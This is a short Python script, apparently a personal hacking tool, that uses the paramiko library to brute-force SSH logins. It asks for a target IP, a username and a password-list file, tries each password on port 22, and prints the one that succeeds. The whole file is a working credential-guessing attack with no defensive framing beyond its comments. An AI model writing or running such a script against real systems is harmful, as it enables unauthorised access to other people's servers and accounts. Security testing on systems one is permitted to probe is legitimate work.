import paramiko
import os
import sys

#enter parameters
target = str(input('please enter IP target: '))
username = str(input('please enter ssh username: '))
password_list = str(input('please enter path to password list: '))

def ssh_connect(password, code=0):
    ssh=paramiko.SSHClient()                                    #set an ssh clinet
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())   #

    try:                                                        #try connect using the parameters
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:                    #if it doesn't work, return code 1 indicating wrong credentials and 
        code=1                                                  #clsoe ssh session
    ssh.close()
    return code                                                 #to determine if ssh session is working

with open(password_list, 'r') as file:                          #open password list in a file and read
    for line in file.readlines():                               #for every line in the file
        password = line.strip()                                 #set the password as the line only
        try:
            response = ssh_connect(password)                    #try to connect using the password and set the variable

            if response == 0:                                   #if code is 0, print credentials
                print ('password found: ' + password)
                exit(0)
            elif response == 1:                                 #if code is 1, print no luck!!
                print ('no luck')
        except Exception as e:                                  #if other errors occured print e and continue
            print (e)
        pass